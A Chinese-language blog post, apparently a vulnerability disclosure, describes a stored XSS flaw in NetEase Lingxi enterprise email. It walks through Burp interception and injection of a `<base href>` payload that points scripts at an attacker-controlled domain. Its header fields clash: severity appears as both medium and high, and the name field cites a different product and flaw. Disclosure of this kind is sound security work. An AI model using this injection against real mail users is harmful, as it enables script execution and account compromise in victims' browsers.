---
layout: post
title:  "中危：网易灵犀企业邮箱存在存储型XSS漏洞"
date:   2024-03-27 10:26:18 +0800
categories: xss
---

## Name

> 网易云课堂ai设计工坊存在文件读取漏洞

## Weakness
> xss

## Severity
> High, 8.5

## Detail

网易灵犀企业邮箱对大部分xss进行了防御性过滤，但是漏掉了`<base>`标签，该标签可以设定网页中所有的路径的base索引，例如script中的src的base路径，当src指向相对路径时，拼接上base路径的href域名才是script真正的下载链接。攻击者可以嵌入base标签，将邮件中的script指向任意网站的脚本，从而触发xss执行。

POC视频：

- 链接：https://pan.baidu.com/s/11lUQvwepL7cq6_UYkE1PQw 

- 提取码：1314




## Steps

1. 首先注册两个灵犀企业邮箱， https://lingxi.office.163.com/ 。由于注册需要手机号验证，所以这里就不提供账号密码。笔者注册了两个账号供测试。账号A： tiankong@tiankong.ntesmail.com，和账号B: tiankong3@tiankong.ntesmail.com。

2. 开启burp，通过账号A给账号B发送邮件，并且拦截发送邮件的请求。

    ![lingxi1](/assets/lingxi/lingxi1.png)

    burp拦截的发送请求：

    ![lingxi2](/assets/lingxi/lingxi2.png)

    可以看到请求体包含邮件的html格式文档，其中开头是head标签：

    ![lingxi3](/assets/lingxi/lingxi3.png)


3. 于是笔者想到head标签可以注入base来改变该文档所有css和script的目标，达到重定向的目的。笔者购买了一个独立域名并且配置了nginx网站： https://sunriseflowers2024.online/. 构造base标签payload： `<base href=\"https://sunriseflowers2024.online/\">`


4. 实施邮件体xss嵌入，首先开启burp的拦截模式：

    ![lingxi4](/assets/lingxi/lingxi4.png)

    拦截到post请求： https://lingxi.office.163.com/js6/s?_host=lingxi.office.163.com&func=mbox%3Acompose&sid=xxx ，对邮件html进行修改，嵌入base 标签xss payload：

    ![lingxi5](/assets/lingxi/lingxi5.png)

    注入之后点击forward，邮件发送成功

5. 登录受害者灵犀企业邮箱，打开邮件，可以看到xss弹框出现。

    ![lingxi6](/assets/lingxi/lingxi6.png)

    ![lingxi7](/assets/lingxi/lingxi7.png)

7. 注入点分析，可以看到base标签成功注入：

    ![lingxi8](/assets/lingxi/lingxi8.png)

## Impacts

1. 直接发送邮件给受害者，受害者打开邮件后即可完成xss攻击